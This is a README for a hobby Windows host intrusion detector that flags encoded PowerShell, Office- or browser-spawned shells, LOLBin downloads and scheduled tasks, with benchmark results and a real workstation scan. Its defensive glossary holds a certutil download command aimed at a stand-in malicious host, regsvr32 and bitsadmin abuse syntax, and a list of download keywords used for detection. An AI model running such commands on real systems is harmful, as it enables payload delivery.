# Host Intrusion Detector

A small host intrusion detection tool for Windows. It reads Sysmon event
logs and flags suspicious behavior: encoded PowerShell, Office or a browser
launching a shell (macro-dropper and drive-by-download chains), built-in
binaries like certutil, mshta and rundll32 downloading remote payloads, new
scheduled tasks (a common persistence method), and programs running from
temp or download folders. New to these terms? See the [Glossary](#glossary).

As with my [LLM_Vulnerability_Scanner](../LLM_Vulnerability_Scanner)
project, I scored the detector against a hand-labeled set of malicious
events, each paired with a benign event that looks similar, using
precision, recall and F1.

## Status

The rule engine, scorer and benchmark corpus are done and passing. Run
`python -m pytest -q` and `hids benchmark` for the current numbers
([Current results](#current-results) has a recent run). I installed Sysmon
on my dev workstation and ran `hids scan` on five days of its log (see
[Real-world scan](#real-world-scan-november-2026)). It found no attacks,
two allowlist gaps (now fixed), and two kinds of expected false positive
from `EXEC_FROM_TEMP`. Installing Sysmon and exporting its log are still
manual steps that need admin rights (see [Installing Sysmon](#installing-sysmon)).

## Why I built it

Most detection tools ask you to trust that their rules work. I wanted to
check mine, so I wrote the answer key first: pairs of malicious and benign
events that use the same program, like `certutil -urlcache` downloading a
payload vs. `certutil -verify` checking a certificate. Then I scored the
detector against it. That way I can say what the precision and recall are
on cases picked to be hard for it, not just that it works.

### Why endpoint logs

Network tools (packet capture, firewall rules) are the usual student
security project. I went with endpoint logs instead: what Sysmon records on
one machine, such as full command lines, parent/child process trees and
file hashes. This is what SOC analysts read most of the day, and the hard
part is knowing normal Windows behavior well enough that a rule doesn't fire
on it. Every malicious case in the benchmark has a benign twin with the same
binary or parent process, so a rule that only matches "certutil.exe" or
"WINWORD.EXE started something" fails.

## Glossary

### Attack chains and techniques

- **Macro-dropper chain**: A phishing email delivers an Office document (Word, Excel) with an embedded VBA macro. When the user opens it and clicks "Enable Content", the macro launches a shell (`cmd.exe`, `powershell.exe`, `wscript.exe`), and that shell downloads ("drops") and runs the real malware. On the host this looks like `WINWORD.EXE → powershell.exe`, which normal Office use almost never produces. This is what `OFFICE_SPAWNED_SHELL` detects.
- **Drive-by-download chain**: The same pattern, but the entry point is the browser. A malicious or compromised website exploits the browser or tricks the user into running a file, which leads to `chrome.exe` / `msedge.exe` / `firefox.exe` spawning a shell. This is what `BROWSER_SPAWNED_SHELL` detects.
- **Living-off-the-land binaries (LOLBins)**: Legitimate, Microsoft-signed programs that ship with Windows and can be repurposed for attacks, such as downloading files, running scripts, or loading code. Attackers like them because they are already on every machine, trusted by allowlisting tools, and blend in with normal admin activity. The [LOLBAS project](https://lolbas-project.github.io/) catalogs them. The ones this tool watches:
  - `certutil.exe`: a certificate-management utility. `certutil -urlcache -split -f <url>` downloads arbitrary files.
  - `mshta.exe`: runs HTML Application (`.hta`) files, including ones fetched straight from a URL, which means it can execute remote script.
  - `rundll32.exe`: calls an exported function in a DLL. It can be abused to run attacker DLLs or inline script.
  - `regsvr32.exe`: registers COM DLLs, the shared components Windows programs use; installers normally run it to tell Windows a component exists. `regsvr32 /i:<url> scrobj.dll` instead makes it download a small script file (`.sct`) from a website and run it. This is the "Squiblydoo" technique, named after the two pieces it uses (`scrobj.dll` and `.sct` files). Attackers like it because it runs their code through a trusted Microsoft program and leaves almost nothing on disk. ATT&CK: [T1218.010](https://attack.mitre.org/techniques/T1218/010/) (System Binary Proxy Execution: Regsvr32).
  - `bitsadmin.exe`: controls BITS (Background Intelligent Transfer Service), the Windows service that downloads Windows Updates quietly in the background and keeps going after a reboot. `bitsadmin /transfer <url>` uses it to download any file. Attackers like it because the download looks like normal Windows Update traffic and keeps retrying until it finishes. ATT&CK: [T1197](https://attack.mitre.org/techniques/T1197/) (BITS Jobs).
- **Payload**: The malicious code an attack ultimately delivers and runs (ransomware, a remote-access trojan, a credential stealer). Droppers and LOLBins are usually just the delivery mechanism.
- **Download indicator**: Text in a command line that shows the program is downloading something from the internet. The LOLBins above run all the time for normal reasons, so `LOLBIN_DOWNLOAD` only fires when one of them also has a download indicator in its command line. For example, `certutil -verify cert.cer` (checking a certificate) is left alone, but `certutil -urlcache -f http://evil.example/a.exe` is flagged. The rule looks for:
  - `http://` or `https://`: a web address.
  - `-urlcache`: certutil's download option.
  - `DownloadString` / `DownloadFile`: the usual PowerShell way to download, sometimes hidden inside an `mshta` or `rundll32` command.
  - `BitsTransfer`: PowerShell's commands for BITS downloads (`Start-BitsTransfer`).

  It's a plain text match, so a file copied from a network share (`\\server\share\file.exe`) has no indicator and isn't caught.
- **Encoded / obfuscated PowerShell**: PowerShell accepts `-EncodedCommand` (or abbreviations like `-enc`, `-e`) followed by a Base64 string of the script, so the real command never appears in plain text in logs or to a casual reader. Legitimate software rarely needs this. Malware uses it constantly, often alongside `-NoProfile`, `-WindowStyle Hidden`, or `-ExecutionPolicy Bypass`. This is what `ENCODED_POWERSHELL` detects.
- **Persistence**: Any mechanism that lets malware survive a reboot or logoff and keep running, such as scheduled tasks, Run registry keys, services, or startup folders.
- **Scheduled task**: A Windows Task Scheduler job that runs a program on a trigger (at logon, every N minutes, at boot). It is created with `schtasks /create` or the Task Scheduler API, and it is one of the most common persistence methods. This is what `SCHEDULED_TASK_CREATED` detects.
- **Execution from temp/download paths**: Legitimate installed software runs from `C:\Program Files` or `C:\Windows`. Freshly dropped malware usually runs from user-writable locations like `%TEMP%`, `%APPDATA%`, or `Downloads`, because those need no admin rights to write to. This is a weak signal on its own (installers do it too), which is why `EXEC_FROM_TEMP` is rated Low.

### Windows telemetry

- **Endpoint telemetry**: Data collected on the host itself (processes, command lines, file writes, network connections), as opposed to network-layer data like packet captures.
- **Sysmon (System Monitor)**: A free Microsoft Sysinternals driver and service that logs detailed security events to the Windows Event Log, well beyond what Windows records by default. Its configuration file controls what is logged and what noise is filtered out.
- **Sysmon Event ID 1 (Process Create)**: Logged every time a process starts. It records the image path, full command line, parent process, user, and file hashes. Most rules in this tool read this event.
- **Security Event ID 4698**: A native Windows Security-log event, "A scheduled task was created". It only appears when the "Audit Other Object Access Events" policy is enabled.
- **Image**: In Sysmon terms, the executable file a process was started from (e.g. `C:\Windows\System32\certutil.exe`).
- **Parent/child process tree**: Every Windows process is started by another one. Following the chain (e.g. `explorer.exe → WINWORD.EXE → powershell.exe`) shows *how* something came to run, which often matters more than *what* ran.
- **`splwow64.exe`**: The print-driver host that Office legitimately spawns when printing. It's the classic benign child of `WINWORD.EXE`, and the reason `OFFICE_SPAWNED_SHELL` checks what the child is instead of firing on any child process.
- **`.evtx`**: The binary file format for Windows Event Log files. Logs can be exported to `.evtx` and analyzed on another machine.
- **`wevtutil`**: A built-in Windows command-line tool for querying and exporting event logs. This tool uses it to read both live channels and `.evtx` files without extra dependencies.

### Detection and evaluation

- **HIDS (Host-based Intrusion Detection System)**: A system that watches activity on a single machine for signs of compromise. It complements a network IDS, which watches traffic.
- **SOC / blue team**: The Security Operations Center, the defenders who triage alerts and investigate incidents. Most of their day is spent reading endpoint telemetry like this.
- **MITRE ATT&CK**: A free, public catalog of how real attackers operate, kept by MITRE (a US non-profit research organization) and built from published incident reports. It's at [attack.mitre.org](https://attack.mitre.org/). Security teams use it as a shared vocabulary: instead of "the PowerShell thing", a finding can say `T1059.001`, and anyone can look up exactly what that means. It's also used to check coverage, i.e. which attacker techniques a team's detections can and can't see.

  It's organized in three levels:
  - **Tactic**: the attacker's *goal* at that stage, such as Initial Access (getting in), Execution (running code), Persistence (staying in after a reboot) or Defense Evasion (avoiding detection).
  - **Technique**: *how* they reach that goal, with an ID like `T1053` (Scheduled Task/Job).
  - **Sub-technique**: a more specific version, shown after a dot, like `T1053.005` (Scheduled Task, as opposed to `.003` Cron on Linux).

  Every rule in this tool tags its findings with one technique ID:

  | ID | Name | Tactic | What it means | Rule |
  |---|---|---|---|---|
  | [`T1059.001`](https://attack.mitre.org/techniques/T1059/001/) | Command and Scripting Interpreter: PowerShell | Execution | Using PowerShell to run attacker commands | `ENCODED_POWERSHELL` |
  | [`T1566.001`](https://attack.mitre.org/techniques/T1566/001/) | Phishing: Spearphishing Attachment | Initial Access | A malicious email attachment, the start of the macro-dropper chain | `OFFICE_SPAWNED_SHELL` |
  | [`T1189`](https://attack.mitre.org/techniques/T1189/) | Drive-by Compromise | Initial Access | Getting in through a malicious or hacked website | `BROWSER_SPAWNED_SHELL` |
  | [`T1053.005`](https://attack.mitre.org/techniques/T1053/005/) | Scheduled Task/Job: Scheduled Task | Execution, Persistence | Using Task Scheduler to run code later or at every logon | `SCHEDULED_TASK_CREATED` |
  | [`T1105`](https://attack.mitre.org/techniques/T1105/) | Ingress Tool Transfer | Command and Control | Downloading tools or payloads onto the machine | `LOLBIN_DOWNLOAD` |
  | [`T1204`](https://attack.mitre.org/techniques/T1204/) | User Execution | Execution | Tricking the user into running something themselves | `EXEC_FROM_TEMP` |

  The LOLBin entries above also mention `T1218.010` and `T1197`. Those describe the specific regsvr32 and BITS tricks, but `LOLBIN_DOWNLOAD` reports `T1105` because what it detects is the download itself.
- **Rule / Finding**: A rule is one detection check applied to an event. A finding is what a rule emits when it fires: the rule ID, severity, ATT&CK technique, and the event that triggered it.
- **Severity**: How urgent a finding is (Low / Medium / High / Critical), based on how strongly the behavior indicates compromise and how rarely it happens legitimately.
- **Risk score**: The total severity of all findings for one process, so a process that trips several rules ranks above one that trips a single weak rule.
- **Allowlist**: A list of known-good activity (by rule and event fields) whose findings are suppressed, so regular noise like an editor's auto-updater doesn't bury real alerts.
- **True positive (TP) / false positive (FP) / false negative (FN)**: A TP is a malicious event correctly flagged. An FP is a benign event wrongly flagged (alert fatigue). An FN is a malicious event missed (a blind spot).
- **Precision / recall / F1**: Precision = TP / (TP + FP), meaning "when it alerts, how often is it right?" Recall = TP / (TP + FN), meaning "of the real attacks, how many did it catch?" F1 is their harmonic mean, which is high only if both are.
- **Labeled corpus / benign-but-similar pair**: The answer key in `tests/fixtures/labeled_events.json`. Each malicious event is paired with a benign one that uses the same binary or parent (e.g. `certutil -urlcache <url>` vs. `certutil -verify`), so a rule only scores well if it checks the behavior and not just the program name.

## Architecture

```
hids/
  events.py              Normalized Event dataclass (Sysmon EventID 1 process-
                         create fields + a generic "extra" bag for other IDs)
                         
  collector.py           Reads events from: a live Sysmon channel, an exported
                         .evtx file (both via wevtutil, no extra install), or a
                         JSON fixture (for tests/demos without Sysmon installed)

  rules.py               6 detection rules, each event-id-typed, each returning
                         a Finding with a severity and a MITRE ATT&CK technique ID

  scorer.py              Groups findings by process into a risk score; grades
                         the rule set against a labeled fixture (precision/recall/F1)

  credaudit_bridge.py    Shells out to the companion credential-auditor
                         project's `credaudit --json` and adapts its findings
                         into HIDS's own risk-score format

  cli.py                 `hids scan <source>`, `hids benchmark [<fixture>]`,
                         and `hids audit-credentials`

tests/
  test_rules.py                  unit tests, one malicious/benign pair per rule

  test_scorer.py                 benchmark-corpus regression test

  test_collector.py              XML parsing + wevtutil error handling (sample output)

  test_cli.py                    subcommand exit codes and output

  test_credaudit_bridge.py       bridge unit tests (subprocess mocked)
  
  fixtures/labeled_events.json   16 hand-labeled synthetic Sysmon events
                                 (8 malicious/benign pairs; malicious rows
                                 also name the rule expected to fire)
```

### Credential-hygiene audit

`hids audit-credentials` covers a different attack surface than the Sysmon rules
above: over-permissioned browser extensions, plaintext secrets in local config files,
and risky browser settings. Rather than duplicating that logic, it delegates to the
companion [`credential-auditor`](../credential_auditor) project's CLI and re-reports
its findings in HIDS's own risk-score format, so one periodic check can cover both
process-level and credential-hygiene risks. Requires `credaudit` to be installed
(`pip install -e .` in `../credential_auditor`) and on PATH.

### Detection rules

| Rule | Sysmon/Security Event | MITRE ATT&CK | Severity |
|---|---|---|---|
| `ENCODED_POWERSHELL` | ID 1 (process create) | T1059.001 | High |
| `OFFICE_SPAWNED_SHELL` | ID 1 | T1566.001 | Critical |
| `BROWSER_SPAWNED_SHELL` | ID 1 | T1189 | High |
| `SCHEDULED_TASK_CREATED` | ID 4698, or `schtasks /create` via ID 1 | T1053.005 | Medium |
| `LOLBIN_DOWNLOAD` | ID 1 (certutil/mshta/rundll32/regsvr32/bitsadmin) | T1105 | High |
| `EXEC_FROM_TEMP` | ID 1 | T1204 | Low |

The rules are narrow on purpose. `OFFICE_SPAWNED_SHELL` only fires when the
child process is a shell or script engine, since Word starts `splwow64.exe`
every time you print. `LOLBIN_DOWNLOAD` only fires when the command line
also has a download indicator (a URL, `-urlcache`, `DownloadString`), not
on every certutil call.

## Current results

Run `hids benchmark` (uses `tests/fixtures/labeled_events.json` by default).
A recent run:

```
Cases: 16  TP=8  FP=0  FN=0
Precision: 1.00  Recall: 1.00  F1: 1.00
```

Each malicious case also names the rule it is meant to trigger, and the
benchmark warns if a different rule fired instead.

The corpus is small (8 malicious/benign pairs, one per rule). 1.00/1.00 on
16 cases I wrote myself shows the rules work as designed. It doesn't show
they would catch real attackers or stay quiet on a busy production network.
The real-world scan below covers the other side: what fires during normal
daily use, which is where false positives turn up.

## Real-world scan (November 2026)

Five days of Sysmon logging on my own dev workstation (Windows 11, SwiftOnSecurity
config), exported from an elevated terminal and scanned with the example
allowlist:

```powershell
# elevated
wevtutil epl Microsoft-Windows-Sysmon/Operational "$env:USERPROFILE\sysmon-export.evtx"
# normal
hids scan "$env:USERPROFILE\sysmon-export.evtx" --allowlist allowlist.example.json
```

| | |
|---|---|
| Time range | 2026-11-20 16:48 to 2026-11-25 16:44 UTC |
| Events read | 38,060 (13,609 process creates, ID 1; the rest are network, DNS, file, registry, etc.) |
| Rule hits | 109 (75 `ENCODED_POWERSHELL`, 34 `EXEC_FROM_TEMP`) |
| Other rules | 0 hits: no LOLBin downloads, no Office/browser spawning a shell, no scheduled-task creation |
| Confirmed malicious | 0 |

Normal daily use (coding, Claude Code sessions, a VS Code update, a driver
install) never set off the four High/Critical behavior rules. Every hit came
from the two rules that look at flags and paths rather than parent processes.

### What fired, and what was done about it

**1. Claude Code's PowerShell 7 calls: 52 `ENCODED_POWERSHELL` hits, allowlist gap (fixed).**
Claude Code launches PowerShell with `-ExecutionPolicy Bypass` and, for its
command parser, `-EncodedCommand`, which is what the rule looks for. The allowlist already covered these command lines, but only
under Windows PowerShell 5.1 (`powershell.exe`). During the scan window
Claude Code switched to PowerShell 7 (`pwsh.exe`, installed from the
Microsoft Store under `C:\Program Files\WindowsApps\Microsoft.PowerShell_7.7.0.0_x64__8wekyb3d8bbwe\`),
so the same commands from a different binary got through. The two Claude
Code entries now also accept `pwsh.exe` from that Store path or
`C:\Program Files\PowerShell\7\`, which are admin-writable locations. A
`pwsh.exe` anywhere else (e.g. `C:\Users\Public\`) is still flagged, and
there is a test for that.

**2. VS Code updater: 1 `ENCODED_POWERSHELL` hit, allowlist gap (fixed).**
During its update, the VS Code installer (`CodeSetup-stable-*.tmp`) runs a
hidden PowerShell command that stops its Explorer context-menu `dllhost.exe`.
The allowlist entry was written from an October update, and this update's
command differs in two small ways: `\"` instead of `""` around the filter,
and no `/Processid:` prefix before the CLSID. The entry now accepts both
forms. The command itself must still match in full, so anything appended to
it still fires.

**3. A venv in a Claude Code scratchpad: 30 `EXEC_FROM_TEMP` hits, expected false positive (left in).**
An earlier Claude Code session built a throwaway virtualenv under
`%TEMP%\claude\<session>\scratchpad\ci_sim\venv\` to simulate a CI run of the
LLM_Vulnerability_Scanner project (`pip install`, `pytest`, `bandit`). The
rule is right that this is an executable running from Temp. It is benign
only because I know what made it. I did not allowlist it: the path is
user-writable and the parents vary (`bash.exe`, `env.exe`, `python.exe`), so
the only possible entry would match by path alone, which is the same
weakness the VS Code temp-setup entry already notes. At severity 3 (Low), 30
grouped findings collapse into one line of output, which is acceptable noise.

**4. An installer run from Downloads: 1 `EXEC_FROM_TEMP` hit, true positive of the behavior, benign intent (left in).**
`Downloads\sqliteodbc_w64 (1).exe` (the SQLite ODBC driver, installed for
another project) was started by `chrome.exe` when I opened it from the
download bar. This is what the rule is for: a freshly downloaded program
running from a user-writable folder. I know it's benign because I ran it.
`BROWSER_SPAWNED_SHELL` stayed quiet, as it should, because the child is an
installer, not a shell.

After the two allowlist fixes, the same export produces:

```
[score 3] C:\Users\<user>\AppData\Local\Temp\claude\<session>\scratchpad\ci_sim\venv\Scripts\python.exe  (x30 processes)
    - EXEC_FROM_TEMP (severity 3, T1204)
[score 3] C:\Users\<user>\Downloads\sqliteodbc_w64 (1).exe  (x2 processes)
    - EXEC_FROM_TEMP (severity 3, T1204)

Suppressed by allowlist (77 findings):
       35  Claude Code: shell tool launcher
       35  Claude Code: PowerShell command parser
        2  VS Code updater: query installed AppX package
        2  VS Code updater: setup executables in temp
        1  VS Code updater: register AppX package
        1  VS Code updater: remove old AppX package
        1  VS Code updater: stop Explorer context-menu host
```

### Takeaways

- **Allowlists break when software updates.** Each allowlist entry describes
  one known-good command exactly. When an update changes that command even a
  little, the entry stops matching. That's what caused both gaps: Claude Code
  switched from `powershell.exe` to `pwsh.exe`, and the VS Code installer
  changed how it quotes one of its commands.

  When this happens, the error is on the safe side: the tool shows an alert it
  should have hidden, rather than hiding something it should have shown. The
  cost is that the allowlist needs checking after updates. To make that easy,
  each report lists how many findings every allowlist entry hid. If an entry
  that normally hides dozens of findings suddenly hides 0, the software it
  covers has probably changed, and the entry needs updating.
- **The heaviest PowerShell user on my machine is an AI coding agent.**
  70 of the 77 suppressed findings are Claude Code's own shell calls. On a
  developer machine, coding agents now make a lot of detection noise, and it
  looks a lot like what the rules look for: hidden windows,
  execution-policy bypass, Base64-encoded commands.
- **`EXEC_FROM_TEMP` is a context signal, not an alert.** Both remaining
  findings are correct about the behavior and benign in intent. That is why
  the rule is rated Low. It is most useful as a score booster when it
  coincides with another rule on the same process (see Roadmap: connect
  related events).
- **What this does *not* show:** five quiet days on one machine say nothing
  about recall against real attacks, because none happened. Recall is still
  measured only by the labeled benchmark.

## Installing Sysmon

The tool doesn't install Sysmon for you. It needs admin rights, so I kept it a manual step:

1. Download Sysmon from Microsoft Sysinternals:
   https://learn.microsoft.com/sysinternals/downloads/sysmon
2. Get a config file. [SwiftOnSecurity's sysmon-config](https://github.com/SwiftOnSecurity/sysmon-config)
   is the common community default. It logs process creation with full
   command lines, network connections and more, and filters out most noise.
3. From an elevated (Administrator) terminal:
   ```
   sysmon64.exe -accepteula -i sysmonconfig-export.xml
   ```
4. Verify it's running: `Get-Service Sysmon64` (PowerShell) should show
   `Running`, and Event Viewer should show a new
   `Applications and Services Logs > Microsoft > Windows > Sysmon > Operational`
   channel filling up with EventID 1 entries as you use the machine.

## Usage

```bash
# Install (editable, with test deps)
pip install -e ".[dev]"

# Run the unit tests + labeled benchmark
python -m pytest -q
python -m hids.cli benchmark

# Scan a JSON fixture (no Sysmon required)
python -m hids.cli scan tests/fixtures/labeled_events.json

# Scan the live Sysmon channel (requires Sysmon installed, admin rights
# to read the Operational log depending on local policy)
python -m hids.cli scan

# Scan an exported .evtx file
python -m hids.cli scan path\to\exported.evtx
```

## Roadmap

- **Connect related events.** Right now each rule looks at one event and
  forgets it. Some attacks only stand out when you link events together.
  For example:

  ```
  10:00:01  invoice.exe starts from Downloads          → EXEC_FROM_TEMP (Low)
  10:00:03  invoice.exe runs "schtasks /create ..."    → SCHEDULED_TASK_CREATED (Medium)
  ```

  Each finding is weak on its own: installers run from Downloads, and IT
  tools create scheduled tasks. Together they show a freshly downloaded
  program setting itself up to run after every reboot, which should be one
  High alert. The risk score doesn't catch this today, because the two
  findings belong to different processes (`invoice.exe` and the
  `schtasks.exe` it started). Fixing it means remembering recent findings
  for a short time window and checking whether each new event's parent was
  just flagged. The benchmark would also need multi-event test cases.
- Try a small local LLM that reads a process's full command line and parent
  chain, and score it against the rule engine on the same benchmark, like
  in LLM_Vulnerability_Scanner.

## License

MIT, see [LICENSE](LICENSE).
